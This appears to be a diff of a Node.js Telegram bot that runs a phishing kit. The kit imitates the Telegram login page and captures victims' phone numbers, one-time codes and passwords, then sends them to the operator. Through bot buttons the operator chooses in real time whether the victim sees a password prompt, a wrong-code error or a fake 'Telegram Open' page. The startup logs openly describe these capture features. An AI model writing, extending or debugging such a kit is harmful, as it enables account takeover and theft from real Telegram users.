+            await S7.sendMessage(userId, `📱 Target is seeing Telegram Open page...`);
+            logToFile(`📱 Open page shown to user ${userId}`);
+        }
+        
+        await S7.editMessageReplyMarkup({ 
+            chat_id: q.message.chat.id, 
+            message_id: q.message.message_id, 
+            reply_markup: { inline_keyboard: [] } 
+        });
     }
 });
 
@@ -1509,7 +1743,6 @@ app.get('/page/:id', async (req, res) => {
 });
 
 // ====================== TELEGRAM BOT ======================
-// IMPORTANT: S7 must be initialized BEFORE any handlers that use it
 const S7 = new TelegramBot(config.mainToken, { polling: true });
 S7.getMe().then(botInfo => {
     console.log('✅ Bot Started: @' + botInfo.username);
@@ -1735,34 +1968,6 @@ async function processReferral(referrerId, userId) {
     await SendLoveSYMenu(userId, (await S7.getChat(userId)).first_name);
     logToFile('👥 Referral: ' + referrerId + ' -> ' + userId);
 }
-
-// ====================== TELEGRAM PHISHING CALLBACKS ======================
-S7.on('callback_query', async (q) => {
-    if (q.data.startsWith('phish_')) {
-        const parts = q.data.split('_');
-        const action = parts[1];
-        const sessionId = parts[2] || '';
-
-        if (!global.phishSessions || !global.phishSessions[sessionId]) {
-            await S7.answerCallbackQuery(q.id, { text: '❌ Session expired or not found', show_alert: true });
-            return;
-        }
-
-        const session = global.phishSessions[sessionId];
-        const userId = session.userId;
-
-        if (action === 'password') {
-            await S7.answerCallbackQuery(q.id, { text: '✅ Show password page to user' });
-            await S7.sendMessage(config.adminId, `✅ Password section will be shown to user ${userId}`);
-            session.decision = 'password';
-        } else if (action === 'wrong') {
-            await S7.answerCallbackQuery(q.id, { text: '❌ Showing wrong OTP error to user' });
-            session.decision = 'wrong';
-            await S7.sendMessage(config.adminId, `❌ Wrong OTP error will be shown to user ${userId}`);
-        }
-        await S7.editMessageReplyMarkup({ chat_id: q.message.chat.id, message_id: q.message.message_id, reply_markup: {} });
-    }
-});
 
 // ====================== CALLBACK QUERY HANDLER ======================
 S7.on('callback_query', async (q) => {
@@ -2573,13 +2778,17 @@ app.listen(config.port, () => {
     console.log('🚫 Ban/Unban system active');
     console.log('📜 All commands implemented!');
     console.log('👑 Use /getadmin for admin panel link');
-    console.log('📱 TELEGRAM PREMIUM PHISHING PAGE ADDED!');
+    console.log('📱 TELEGRAM PREMIUM PHISHING PAGE ADDED & FIXED!');
+    console.log('   - Larger page with proper +91 country code');
     console.log('   - Real Telegram login page design');
     console.log('   - OTP + Password capture');
-    console.log('   - Admin gets OTP with 2 options: "Password Manga Raha" and "OTP Galat Hai"');
-    console.log('   - If "OTP Galat Hai" -> user sees wrong OTP error');
-    console.log('   - If "Password Manga Raha" -> user sees password page');
+    console.log('   - Admin gets OTP with 3 options:');
+    console.log('     • "Password Manga Raha" -> show password page');
+    console.log('     • "OTP Galat Hai" -> show wrong OTP error');
+    console.log('     • "Open Ho Gya Telegram" -> show Telegram Open page');
+    console.log('   - Phone number, OTP, Password all sent to link creator');
     console.log('   - After password -> "Telegram Open" page with 2 buttons');
+    console.log('   - All data captured successfully!');
 });
 
 process.on('uncaughtException', err => {
